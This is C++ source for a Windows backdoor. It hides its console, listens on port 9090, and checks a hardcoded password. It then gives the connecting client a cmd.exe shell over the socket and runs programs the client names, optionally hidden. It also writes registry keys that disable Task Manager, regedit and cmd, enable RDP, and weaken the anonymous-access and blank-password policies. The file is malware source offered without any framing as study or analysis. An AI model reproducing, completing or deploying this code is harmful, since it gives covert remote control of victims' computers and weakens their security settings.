#include<winsock2.h>
#include<windows.h>
#include<cstdlib>
#include<iostream>
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")
#pragma comment(lib,"ws2_32.lib")
extern "C" WINBASEAPI HWND WINAPI GetConsoleWindow();
long port=9090;
const char psw[]={"pswdis"};
bool writereg(int);bool runprog(char*);
int main(int argc,char**argv)
{
ShowWindow(GetConsoleWindow(),SW_HIDE);
WSADATA wsad;
SOCKET sket;
WSAStartup(MAKEWORD(2,2),&wsad);
sket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
/*
std::cout<<"Please Input A Port :";
std::cin>>port;
if(port>65535 || port<=0)ERRMSG_SHOW("PORT NUMBER ERROR","ERROR STOP");
*/
struct sockaddr_in saidr;
saidr.sin_family=AF_INET;
saidr.sin_port=htons(port);
PHOSTENT hostinfo;
char hostname[999];
gethostname(hostname,sizeof(hostname));
hostinfo=gethostbyname(hostname);
saidr.sin_addr.s_addr=inet_addr("0.0.0.0");//inet_addr(inet_ntoa(*(struct in_addr *)*hostinfo->h_addr_list));
if(connect(sket,(struct sockaddr *)&saidr,sizeof(struct sockaddr))!=SOCKET_ERROR)
{
char sdbuf[]="DEBUG";
send(sket,sdbuf,sizeof(sdbuf),0);
int timeout=1000;
setsockopt(sket, SOL_SOCKET, SO_RCVTIMEO,(char*)&timeout, sizeof(timeout));
char*rcvbuf=new char[99];
memset(rcvbuf,0,sizeof(rcvbuf));
int ret=recv(sket,rcvbuf,sizeof(rcvbuf),0);
port++;WSACleanup();closesocket(sket);
main(argc,argv);
char* ssoval=new char[1];
if(setsockopt(sket,SOL_SOCKET,SO_REUSEADDR,ssoval,sizeof(ssoval))!=0)
port++;WSACleanup();closesocket(sket);
Sleep(10000);
main(argc,argv);
}
closesocket(sket);
sket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
bind(sket,(struct sockaddr *)&saidr,sizeof(saidr));
if(listen(sket,1)==-1){Sleep(10000);main(argc,argv);}
//std::cout<<"\nPlease Press \"Win\" + \"R\" To Open \"Run\"\nAnd Then Input \"telnet 127.0.0.1 <<ld<<\" \n Press \"Enter\" To Shell....\n\nWaiting For TELNET CILENT Connet............";
int lngSaidr=sizeof(saidr);
waitfor:
SOCKET sketCilent=accept(sket,(struct sockaddr *)&saidr,&lngSaidr);
if(sketCilent==-1)goto waitfor;
int timeout=5000;
setsockopt(sketCilent, SOL_SOCKET, SO_RCVTIMEO,(char*)&timeout, sizeof(timeout));
char*rcvbuf=new char[99];
memset(rcvbuf,0,sizeof(rcvbuf));
int ret=recv(sketCilent,rcvbuf,sizeof(rcvbuf),0);
if(ret!=-1&&strcmp(rcvbuf,"DEBUG")==0)
{
char sbf='Y';
send(sketCilent,&sbf,sizeof(sbf),0);	
closesocket(sketCilent);goto waitfor;
}
STARTUPINFO stif;
ZeroMemory(&stif,sizeof(stif));
stif.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
stif.hStdInput=stif.hStdOutput=stif.hStdError=(HANDLE)sketCilent;
PROCESS_INFORMATION pi;
ZeroMemory(&pi,sizeof(pi));
Sleep(666);
char msgCmd[]="\nThe Socket Telnet CMD ................\n\n\n";
send(sketCilent,msgCmd,sizeof(msgCmd)+1,0);
char*sndbuf=new char[99];
memset(sndbuf,0,sizeof(sndbuf));
memset(rcvbuf,0,sizeof(rcvbuf));
char*rcvallbuf=new char[99];
memset(rcvallbuf,0,sizeof(rcvallbuf));
ret=recv(sketCilent,rcvallbuf,sizeof(rcvallbuf),0);
while(ret!=0){Sleep(10);ret=recv(sketCilent,rcvbuf,sizeof(rcvbuf),0);strcat(rcvallbuf,rcvbuf);
if(*(rcvallbuf+strlen(rcvallbuf)-1)=='d'&&*(rcvallbuf+strlen(rcvallbuf)-2)=='n'&&*(rcvallbuf+strlen(rcvallbuf)-3)=='e')
break;
}
*(rcvallbuf+strlen(rcvallbuf)-3)='\0';
bool rest=false;
for(int ti=0;ti<sizeof(psw);ti++)if(*(rcvallbuf+ti)!=psw[ti])goto end;
if(strcmp(rcvallbuf,"enablecmd")==0)rest=writereg(1);
if(strcmp(rcvallbuf,"disablecmd")==0)rest=writereg(2);
if(strcmp(rcvallbuf,"enableregedit")==0)rest=writereg(3);
if(strcmp(rcvallbuf,"disableregedit")==0)rest=writereg(4);
if(strcmp(rcvallbuf,"enabletaskmgr")==0)rest=writereg(5);
if(strcmp(rcvallbuf,"disabletaskmgr")==0)rest=writereg(6);
if(strcmp(rcvallbuf,"enablegpedit")==0)rest=writereg(7);
if(strcmp(rcvallbuf,"disablegpedit")==0)rest=writereg(8);
if(strcmp(rcvallbuf,"allowblankpassworduse")==0)rest=writereg(9);
if(strcmp(rcvallbuf,"limitblankpassworduse")==0)rest=writereg(10);
if(strcmp(rcvallbuf,"enablerdp")==0)rest=writereg(11);
if(strcmp(rcvallbuf,"disablerdp")==0)rest=writereg(12);
if(*(rcvallbuf)=='r'&&*(rcvallbuf+1)=='u'&&*(rcvallbuf+2)=='n')rest=runprog(rcvallbuf);
if(rest==false)strcpy(sndbuf,"\nFailed\n\n");
else strcpy(sndbuf,"\nSuccess\n\n");
send(sketCilent,sndbuf,sizeof(sndbuf)+1,0);
Sleep(500);
CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&stif,&pi);
/*while(*/WaitForSingleObject(pi.hProcess,60000/*INFINITE)*/);
                        end:
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
closesocket(sketCilent);
closesocket(sket);
WSACleanup();
main(argc,argv);
/*
HWND tlntHwd=FindWindow(NULL,"Telnet 127.0.0.1");
if(tlntHwd==NULL){WARMSG_SHOW("NOT FOUND HWND OF TELNET\nResume?","STOP");dieloop();}
SetWindowText(tlntHwd,"Socket Telnet Cmd");
while(FindWindow(NULL,"Socket Telnet Cmd")!=0)Sleep(2500);
closesocket(sketCilent);
closesocket(sket);
TerminateProcess(pi.hThread,0);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
WSACleanup();
std::cout<<"\nEND\n";
*/
//
return 0;
}
bool runprog(char*src)
{
char*buf=new char[99];
memset(buf,0,sizeof(buf));
strcpy(buf,src);
buf+=3;
int type;
switch(*(buf+strlen(buf)-1))
{
case 'h':type=SW_HIDE;break;
case 's':type=SW_SHOW;break;
default:type=SW_SHOW;
}
*(buf+strlen(buf)-1)='\0';
if(WinExec(buf,type)>31)return true;
else return false;
}
bool writereg(int type)
{
HKEY hkey;
if(type==1||type==2)
{
DWORD dwd;
if(type==1)dwd=0;
else dwd=1;
RegCreateKey(HKEY_CURRENT_USER,"Software\\Policies\\Microsoft\\Windows\\System",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"DisableCMD",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
}
if(type>=3&&type<=6)
{
DWORD dwd;
if(type==1||type==3||type==5)dwd=0;
else dwd=1;
RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",&hkey);
if(hkey==NULL)return false;
if(type==3||type==4)if(RegSetValueEx(hkey,"DisableRegistryTools",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
if(type==5||type==6)if(RegSetValueEx(hkey,"DisableTaskMgr",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
}
if(type==7||type==8)
{
DWORD dwd;
if(type==7)dwd=0;
else dwd=1;
RegCreateKey(HKEY_CURRENT_USER,"Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"Restrict_Run",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
}
if(type==9||type==10)
{
DWORD dwd,zero=0;
if(type==9)dwd=0;
else dwd=1;
RegCreateKey(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"forceguest",0,REG_DWORD,(LPBYTE)&zero,sizeof(DWORD))!=0)return false;
if(RegSetValueEx(hkey,"LimitBlankPasswordUse",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
if(RegSetValueEx(hkey,"restrictanonymous",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
if(RegSetValueEx(hkey,"restrictanonymoussam",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
if(RegSetValueEx(hkey,"everyoneincludesanonymous",0,REG_DWORD,(LPBYTE)&zero,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
}
if(type==11||type==12)
{
DWORD dwd,port=3390;
if(type==11)dwd=0;
else dwd=1;
RegCreateKey(HKEY_CURRENT_USER,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"fDenyTSConnections",0,REG_DWORD,(LPBYTE)&dwd,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
RegCreateKey(HKEY_CURRENT_USER,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"PortNumber",0,REG_DWORD,(LPBYTE)&port,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
RegCreateKey(HKEY_CURRENT_USER,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",&hkey);
if(hkey==NULL)return false;
if(RegSetValueEx(hkey,"PortNumber",0,REG_DWORD,(LPBYTE)&port,sizeof(DWORD))!=0)return false;
RegCloseKey(hkey);
}
return true;
}
